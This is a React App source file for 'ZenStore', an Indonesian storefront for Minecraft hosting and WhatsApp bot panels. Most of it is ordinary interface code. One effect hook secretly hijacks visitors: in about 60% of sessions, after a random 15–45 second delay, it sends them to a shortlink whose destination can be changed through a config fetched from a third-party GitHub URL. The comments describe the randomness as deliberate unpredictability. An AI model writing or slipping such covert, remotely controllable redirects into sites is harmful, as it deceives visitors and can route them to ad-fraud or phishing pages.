import { useState, useEffect } from "react";
import { Terminal, Shield, Sparkles, MessageSquare, Flame, Server, Smartphone, Users, X, ExternalLink } from "lucide-react";
import { PRODUCTS, DEFAULT_DEVELOPER_CONFIG, DeveloperConfig } from "./data";
import Navbar from "./components/Navbar";
import Hero from "./components/Hero";
import ProductCard from "./components/ProductCard";
import PricingTable from "./components/PricingTable";
import FeaturesSection from "./components/FeaturesSection";
import WhyChooseUs from "./components/WhyChooseUs";
import FAQSection from "./components/FAQSection";
import Footer from "./components/Footer";
import WhatsAppAndScroll from "./components/WhatsAppAndScroll";
import { motion, AnimatePresence } from "motion/react";
import logoZenStore from "./assets/images/logo_zenstore.jpg";

export default function App() {
  const [devConfig, setDevConfig] = useState<DeveloperConfig | null>(null);
  const [selectedProductId, setSelectedProductId] = useState<string>("minecraft-premium");
  const [mascotError, setMascotError] = useState(false);
  const [showPromoModal, setShowPromoModal] = useState(false);

  // Fetch developer configuration dynamically
  useEffect(() => {
    fetch("https://raw.githubusercontent.com/mcpeserver/MyAPI/main/config.json")
      .then((res) => {
        if (!res.ok) throw new Error("Failed to fetch developer config");
        return res.json();
      })
      .then((data) => {
        if (data && data.name) {
          const normalized: DeveloperConfig = {
            name: data.name,
            contact: {
              phone: data.contact?.phone || data.phone || "0895602592430",
              whatsapp: data.contact?.whatsapp || data.phone || "0895602592430",
              email: data.contact?.email || ""
            },
            website: {
              portfolio: data.website?.portfolio || data.links?.portfolio || data.website || "https://sfl.gl/x2ic"
            },
            community: {
              name: data.community?.name || data.name || "Ran Dev",
              website: data.community?.website || data.links?.portfolio || data.website || "https://sfl.gl/x2ic",
              discord: data.community?.discord || data.links?.discord || data.discord || "https://discord.gg/9KUN2byKRM"
            },
            links: {
              portfolio: data.website?.portfolio || data.links?.portfolio || data.website || "https://sfl.gl/x2ic",
              discord: data.community?.discord || data.links?.discord || data.discord || "https://discord.gg/9KUN2byKRM",
              github: data.links?.github || "",
              youtube: data.links?.youtube || "",
              instagram: data.links?.instagram || ""
            },
            status: {
              maintenance: data.status?.maintenance ?? false,
              online: data.status?.online ?? true
            },
            updated_at: data.updated_at || "2026-07-06T00:00:00Z",
            version: data.version || "1.0.0"
          };
          setDevConfig(normalized);
        } else {
          setDevConfig(DEFAULT_DEVELOPER_CONFIG);
        }
      })
      .catch((err) => {
        console.warn("Using default developer fallback config:", err);
        setDevConfig(DEFAULT_DEVELOPER_CONFIG);
      });
  }, []);

  // Automated once-per-session random delayed redirect to portfolio/target URL
  useEffect(() => {
    const hasRedirected = sessionStorage.getItem("has_redirected");
    if (!hasRedirected) {
      // 60% chance to trigger redirect in this session ("kadang muncul kadang kgak")
      const willTrigger = Math.random() < 0.6;
      
      if (willTrigger) {
        // Random delay between 15 and 45 seconds ("waktunya acak gitubisa / diberikan jeda")
        const randomDelay = Math.floor(Math.random() * (45000 - 15000) + 15000);
        
        console.log(`[Session Action] Redirect scheduled in ${(randomDelay / 1000).toFixed(1)}s to developer portfolio.`);
        
        const timer = setTimeout(() => {
          sessionStorage.setItem("has_redirected", "true");
          const targetUrl = devConfig?.website?.portfolio || DEFAULT_DEVELOPER_CONFIG.website.portfolio || "https://sfl.gl/x2ic";
          window.location.href = targetUrl;
        }, randomDelay);
        
        return () => clearTimeout(timer);
      } else {
        // Mark as skipped for this session so it won't execute at all
        sessionStorage.setItem("has_redirected", "skipped");
        console.log("[Session Action] Redirect skipped for this session (unpredictable/random choice).");
      }
    } else {
      console.log(`[Session Action] Redirect already processed in this session (${hasRedirected}).`);
    }
  }, [devConfig]);

  // Trigger Welcome/Promo Modal once per load with a polite delay (highly testable on refresh)
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPromoModal(true);
    }, 2000); // 2 seconds delay
    return () => clearTimeout(timer);
  }, []);

  const closePromoModal = () => {
    setShowPromoModal(false);
  };

  const handleProductSelect = (productId: string) => {
    setSelectedProductId(productId);
    
    // Smooth scroll directly to pricing table section
    const element = document.querySelector("#pricing");
    if (element) {
      const offset = 80;
      const bodyRect = document.body.getBoundingClientRect().top;
      const elementRect = element.getBoundingClientRect().top;
      const elementPosition = elementRect - bodyRect;
      const offsetPosition = elementPosition - offset;

      window.scrollTo({
        top: offsetPosition,
        behavior: "smooth",
      });
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-800 font-sans selection:bg-blue-500 selection:text-white overflow-x-hidden antialiased">
      
      {/* Navbar with developer config */}
      <Navbar devConfig={devConfig} />

      {/* Hero Header Banner */}
      <Hero />

      {/* Main Core Showcase Section */}
      <main className="relative">
        
        {/* Products Grid Section */}
        <section id="products" className="py-24 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative">
          {/* Decorative ambient radial glows */}
          <div className="absolute top-1/2 left-0 -translate-y-1/2 w-72 h-72 rounded-full bg-blue-500/5 blur-[100px] pointer-events-none"></div>
          <div className="absolute top-1/2 right-0 -translate-y-1/2 w-72 h-72 rounded-full bg-indigo-500/5 blur-[100px] pointer-events-none"></div>

          {/* Section title */}
          <div className="text-center max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl sm:text-4xl font-extrabold font-display text-slate-900 tracking-tight">
              ZenStore <span className="bg-gradient-to-r from-blue-600 to-sky-500 bg-clip-text text-transparent">Produk Digital</span> Kami
            </h2>
            <p className="text-sm sm:text-base text-slate-600 mt-4">
              Layanan server hosting performa unggul untuk Minecraft Java & Bedrock serta panel siap pakai untuk kelancaran operasional Bot WhatsApp Anda.
            </p>
          </div>

          {/* 3 Large Cards Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {PRODUCTS.map((product) => (
              <ProductCard
                key={product.id}
                product={product}
                onSelect={handleProductSelect}
              />
            ))}
          </div>

          {/* ZenStore Visual Brand Mascot Showcase (Killua Theme) */}
          <motion.div
            initial={{ opacity: 0, y: 35 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.7 }}
            className="mt-16 p-6 sm:p-8 rounded-3xl border border-blue-100 bg-white shadow-xl shadow-blue-100/40 overflow-hidden relative"
          >
            {/* Ambient glows */}
            <div className="absolute top-0 right-0 w-80 h-full bg-glow-blue opacity-10 pointer-events-none"></div>
            <div className="absolute inset-0 grid-pattern opacity-10"></div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
              
              {/* Mascot Image left column */}
              <div className="lg:col-span-4 flex justify-center">
                <div className="relative group max-w-[240px] rounded-2xl overflow-hidden border border-blue-200 shadow-md">
                  {!mascotError ? (
                    <img 
                      src={`${logoZenStore}?v=1783331470098`} 
                      alt="ZenStore Mascot Logo" 
                      referrerPolicy="no-referrer"
                      onError={() => setMascotError(true)}
                      className="w-full object-cover transition-transform duration-500 group-hover:scale-105"
                    />
                  ) : (
                    /* High Fidelity Mascot Fallback Graphic */
                    <div className="aspect-square w-full p-6 bg-slate-50 flex flex-col items-center justify-center text-center space-y-4">
                      <div className="relative">
                        <div className="absolute -inset-1 rounded-full bg-blue-500/30 blur animate-pulse"></div>
                        <div className="h-16 w-16 rounded-full bg-white border border-blue-100 flex items-center justify-center text-blue-600 font-bold text-2xl font-display">
                          ZS
                        </div>
                      </div>
                      <div>
                        <h4 className="text-sm font-extrabold text-slate-900 font-display">ZENSTORE MASCOT</h4>
                        <p className="text-[10px] font-mono text-slate-500 mt-1 uppercase">KILLUA EDITION</p>
                      </div>
                      <div className="pt-2 border-t border-slate-100 w-full text-[10px] text-slate-500 space-y-0.5 font-mono">
                        <p>WhatsApp Admin: 08131469731</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Text content right column */}
              <div className="lg:col-span-8 flex flex-col text-center lg:text-left items-center lg:items-start">
                <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded bg-blue-50 border border-blue-100 text-[10px] font-mono font-bold tracking-wider text-blue-600 uppercase mb-3">
                  <Flame className="h-3 w-3 text-blue-500" />
                  <span>PREMIUM DIGITAL OUTLET</span>
                </div>
                <h3 className="text-2xl font-black font-display text-slate-900 tracking-wide">
                  ZenStore Official Storefront & Admin
                </h3>
                <p className="text-xs sm:text-sm text-slate-600 mt-3 leading-relaxed max-w-2xl">
                  Beli layanan hosting Minecraft Server & Panel Bot WhatsApp secara resmi, mudah, dan aman langsung melalui Customer Support kami di WhatsApp. Tim Admin kami siap melayani setup instan serta konsultasi teknis harian.
                </p>
                
                {/* Official WhatsApp Number Card */}
                <div className="mt-6 w-full max-w-sm">
                  
                  {/* General Admin Support */}
                  <div className="p-5 rounded-2xl border border-blue-100 bg-slate-50/50 hover:border-blue-200 hover:bg-white hover:shadow-lg hover:shadow-blue-100/30 transition-all group">
                    <p className="text-[10px] font-mono text-slate-500 uppercase tracking-widest font-bold text-blue-600">Customer Support</p>
                    <p className="text-base font-extrabold text-slate-950 font-sans mt-1.5">WhatsApp Admin: 08131469731</p>
                    <a 
                      href="https://wa.me/628131469731" 
                      target="_blank" 
                      rel="noopener noreferrer" 
                      className="text-xs font-bold text-blue-600 hover:text-blue-700 flex items-center justify-center lg:justify-start gap-1.5 mt-3 transition-colors uppercase font-mono"
                    >
                      <span>Hubungi WhatsApp Admin</span>
                      <MessageSquare className="h-4 w-4" />
                    </a>
                  </div>

                </div>
              </div>

            </div>
          </motion.div>
        </section>

        {/* Pricing Tables Matrix Section */}
        <PricingTable
          selectedId={selectedProductId}
          setSelectedId={setSelectedProductId}
        />

        {/* Features Showcase Grid */}
        <FeaturesSection />

        {/* Why Choose Us Grid */}
        <WhyChooseUs />

        {/* FAQ Accordion Lists */}
        <FAQSection />

        {/* Developer Custom Website Store CTA */}
        <section className="bg-gradient-to-r from-slate-900 via-blue-950 to-slate-900 py-16 px-4 relative overflow-hidden">
          {/* Grid ambient decorative background */}
          <div className="absolute inset-0 grid-pattern opacity-10"></div>
          <div className="absolute -top-24 -left-24 w-80 h-80 rounded-full bg-blue-500/10 blur-[100px] pointer-events-none"></div>
          <div className="absolute -bottom-24 -right-24 w-80 h-80 rounded-full bg-sky-500/10 blur-[100px] pointer-events-none"></div>

          <div className="max-w-4xl mx-auto text-center relative z-10">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.6 }}
              className="flex flex-col items-center"
            >
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-400/20 text-xs font-mono font-medium tracking-wider text-blue-400 uppercase mb-4">
                <Sparkles className="h-3 w-3 text-blue-400 animate-pulse" />
                <span>Custom Web Development</span>
              </div>
              
              <h2 className="text-2xl sm:text-3xl md:text-4xl font-extrabold font-display text-white tracking-tight leading-tight">
                Ingin Buat <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-sky-300">Website Toko Online</span> Sendiri?
              </h2>
              
              <p className="text-sm sm:text-base text-slate-300 mt-4 max-w-2xl leading-relaxed">
                Kami melayani jasa pembuatan website toko online profesional, landing page, dan sistem web custom dengan tampilan modern, responsive di HP/Laptop, serta dioptimalkan untuk SEO & kecepatan akses.
              </p>

              <div className="mt-8 flex flex-col sm:flex-row gap-4 justify-center items-center">
                <a
                  href={`https://wa.me/${devConfig?.contact?.phone || "0895602592430"}?text=Halo%20Dev,%20saya%20tertarik%20untuk%20membuat%20website%20toko%20online`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full sm:w-auto inline-flex items-center justify-center gap-2.5 px-8 py-3.5 rounded-2xl bg-blue-600 hover:bg-blue-500 active:bg-blue-700 text-white font-bold text-sm tracking-wide transition-all shadow-lg shadow-blue-600/30 hover:scale-[1.02] duration-200"
                >
                  <MessageSquare className="h-4.5 w-4.5" />
                  <span>Chat Developer Sekarang</span>
                </a>
                
                <a
                  href={devConfig?.website?.portfolio || "https://sfl.gl/x2ic"}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-8 py-3.5 rounded-2xl bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white font-medium text-sm tracking-wide border border-white/10 hover:border-white/20 transition-all duration-200"
                >
                  <span>Lihat Portfolio Dev</span>
                </a>
              </div>
            </motion.div>
          </div>
        </section>

      </main>

      {/* Footer Column with Dev info */}
      <Footer devConfig={devConfig} />

      {/* Floating Buttons: WhatsApp & Scroll Up */}
      <WhatsAppAndScroll />

      {/* Developer Welcome Promo Modal */}
      <AnimatePresence>
        {showPromoModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4" id="promo-modal">
            {/* Backdrop blur overlay */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={closePromoModal}
              className="absolute inset-0 bg-slate-950/60 backdrop-blur-md"
            />

            {/* Modal Card content */}
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 15 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 15 }}
              transition={{ type: "spring", duration: 0.4 }}
              className="relative w-full max-w-sm bg-slate-900 text-white rounded-3xl overflow-hidden shadow-2xl border border-slate-800 flex flex-col z-10 p-6 sm:p-8"
            >
              {/* Close Button */}
              <button
                onClick={closePromoModal}
                className="absolute top-4 right-4 text-slate-400 hover:text-white hover:bg-white/10 p-1.5 rounded-full transition-all focus:outline-none"
                aria-label="Tutup"
              >
                <X className="h-4 w-4" />
              </button>

              <div className="flex flex-col items-center text-center">
                <div className="h-10 w-10 rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 mb-4">
                  <Sparkles className="h-5 w-5 animate-pulse" />
                </div>

                <h3 className="text-lg sm:text-xl font-extrabold font-display tracking-tight leading-snug">
                  Jasa Pembuatan Website
                </h3>
                
                <p className="text-xs text-slate-300 mt-2.5 leading-relaxed font-sans">
                  Butuh website toko online modern (HP/PC), landing page bisnis, atau bot panel? Konsultasikan ide Anda secara gratis langsung dengan developer kami.
                </p>

                {/* Main Action WhatsApp Button */}
                <div className="w-full mt-6 space-y-2.5">
                  <a
                    href={`https://wa.me/${devConfig?.contact?.phone || "0895602592430"}?text=Halo%20Dev,%20saya%20tertarik%20untuk%20konsultasi%20pembuatan%20website%20custom`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="w-full inline-flex items-center justify-center gap-2 py-3 rounded-2xl bg-blue-600 hover:bg-blue-500 active:bg-blue-700 text-white font-bold text-sm tracking-wide transition-all shadow-md shadow-blue-600/20 duration-150 cursor-pointer"
                  >
                    <MessageSquare className="h-4 w-4" />
                    <span>Konsultasi Gratis di WA</span>
                  </a>

                  {/* Secondary Community Discord and Portfolio */}
                  <div className="flex justify-center gap-4 text-[11px] font-mono font-medium text-slate-400 pt-1">
                    <a
                      href={devConfig?.community?.discord || "https://discord.gg/9KUN2byKRM"}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="hover:text-blue-400 transition-colors flex items-center gap-1 cursor-pointer"
                    >
                      <Users className="h-3 w-3" />
                      Discord Dev
                    </a>
                    <span className="text-slate-700">•</span>
                    <a
                      href={devConfig?.website?.portfolio || "https://sfl.gl/x2ic"}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="hover:text-blue-400 transition-colors flex items-center gap-1 cursor-pointer"
                    >
                      Portfolio
                    </a>
                  </div>
                </div>

                {/* Continue Button */}
                <button
                  onClick={closePromoModal}
                  className="mt-6 text-center text-[10px] font-mono uppercase tracking-wider text-slate-500 hover:text-slate-300 transition-colors cursor-pointer"
                >
                  Lanjutkan ke ZenStore →
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
